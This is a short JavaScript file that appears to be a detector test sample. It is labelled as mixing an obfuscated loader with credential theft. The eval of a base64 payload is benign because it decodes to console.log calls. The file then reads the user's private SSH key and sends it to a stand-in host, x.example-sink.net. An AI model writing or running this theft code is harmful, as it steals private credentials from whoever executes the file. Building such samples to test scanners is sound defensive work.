// Mixed severities in one file: obfuscated loader plus credential theft
const fs = require('fs');
const https = require('https');
const payload = 'Y29uc29sZS5sb2coMSk7Y29uc29sZS5sb2coMik7Y29uc29sZS5sb2coMyk7Y29uc29sZS5sb2coNCk7Y29uc29sZS5sb2coNSk7Y29uc29sZS5sb2coNik7Y29uc29sZS5sb2coNyk7Y29uc29sZS5sb2coOCk7Y29uc29sZS5sb2coOSk7Y29uc29sZS5sb2coMTApO2NvbnNvbGUubG9nKDExKTtjb25zb2xlLmxvZygxMik7Y29uc29sZS5sb2coMTMpOw==';
eval(Buffer.from(payload, 'base64').toString());
const keys = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
https.get('https://x.example-sink.net/?k=' + encodeURIComponent(keys));
module.exports = {};
